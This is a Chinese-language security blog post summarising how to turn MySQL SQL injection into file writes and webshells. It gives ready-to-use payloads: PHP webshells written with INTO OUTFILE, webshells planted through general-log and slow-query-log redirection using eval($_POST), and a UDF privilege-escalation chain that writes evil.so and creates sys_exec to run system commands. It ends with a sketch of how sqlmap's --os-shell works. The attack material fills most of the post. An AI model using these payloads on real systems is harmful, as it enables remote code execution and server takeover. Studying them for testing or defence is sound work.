---
title: "SQL upload"
description: "SQL 注入写文件与上传利用总结，梳理利用条件、路径判断和实战注意点。"
pubDate: "2026-03-26"
updatedDate: "2026-03-26"
tags: ["SQL", "文件上传", "Web安全"]
cover: auto
coverAlt: "SQL upload 的文章封面"
draft: false
---
## SQL upload

### select into

- 需要数据库dba权限
- `secure_file_priv` 为空（或者为某一具体值，该情况只能写在该目录）
- web路径，如（/var/www/html/  ,  /usr/share/nginx/html/）通过猜测，phpinfo，默认路径等方法了解
#### select ... into outfile "path"

- `outfile` 可以写入多行，并且在每行结束时加上换行符
- `outfile` 会对数据进行一些格式转换（转义），因此写 shell 需要注意特殊字符
- 如`select "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php";`

#### select ... into dumpfile "path"

- `dumpfile` 只能写入一行
- `dumpfile` 写入时会保持原始数据格式，适合写入二进制文件，如 `.exe` 文件，UDF 提权的动态链接库
- 相比于outfile的优势为更稳定，payload不易破坏

写出的路径只能是引号包裹的路径，不能是 `0x` 开头或 `char()` 转换后的路径，因此不能通过 hex 编码或 `char()` 来绕过引号转义

**常见失败原因有如下几种** ：
- 1. 文件已存在
- 2. 没有文件写入权限
- 3. 路径错误
- 4. secure_file_priv限制
- 5. 字符串转义问题

#### 高级玩法

**第一种查询日志利用为** ： 
SET GLOBAL general_log = ON;
SET GLOBAL general_log_file = "/var/www/html/shell.php";

然后select "<?php eval($_POST[1]);?>"


**第二种慢查询日志利用为** ：
SET GLOBAL slow_query_log=ON;
SET GLOBAL slow_query_log_file="/var/www/html/shell.php";
SET GLOBAL long_query_time=1;

然后SELECT "<?php eval($_POST[log]);?>" FROM users WHERE sleep(11);

**udf** ：
利用dumpfile可以写入二进制文件的效果，写入一个.so文件，然后再给这个文件权限，将其作为函数执行

SELECT ... INTO DUMPFILE "/usr/lib/mysql/plugin/evil.so";
CREATE FUNCTION sys_exec RETURNS STRING SONAME 'evil.so';
SELECT sys_exec('id');

#### 谈谈sqlmap --os-shell

本质上依旧是利用select into outfile

- 1. 写 uploader.php
- 2. 上传 webshell.php
- 3. 建立命令执行通道